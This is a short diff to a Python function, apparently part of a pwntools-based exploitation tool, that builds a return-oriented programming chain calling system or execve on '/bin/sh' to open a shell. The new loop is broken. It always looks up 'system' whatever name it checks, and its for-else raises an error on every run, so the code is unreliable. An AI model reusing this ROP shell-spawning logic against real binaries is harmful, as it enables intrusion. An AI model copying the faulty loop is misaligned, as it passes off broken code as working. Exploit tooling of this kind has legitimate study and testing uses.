@@ -56,15 +56,17 @@ def get_rop_chain(properties):
     rop = ROP(elf)
 
     strings = [b"/bin/sh\x00", b"/bin/bash\x00"]
+    functions = ["system","execve"]
 
-    ret_symbol = None
+    ret_func = None
     ret_string = None
 
     # Find the function we want to call
-    if "system" in elf.symbols:
-        ret_symbol = elf.symbols["system"]
-    elif "execve" in symbols:
-        ret_symbol = elf.symbols["execve"]
+    for function in functions:
+        if function in elf.symbols:
+            ret_func = elf.symbols["system"]
+        elif function in elf.plt:
+            ret_func = elf.plt["system"]
     else:
         raise RuntimeError("Cannot find symbol to return to")
 
@@ -80,7 +82,7 @@ def get_rop_chain(properties):
 
     # movabs
     rop.raw(rop.ret.address)
-    rop.call(ret_symbol, [ret_string])
+    rop.call(ret_func, [ret_string])
 
     print(rop.dump())
 
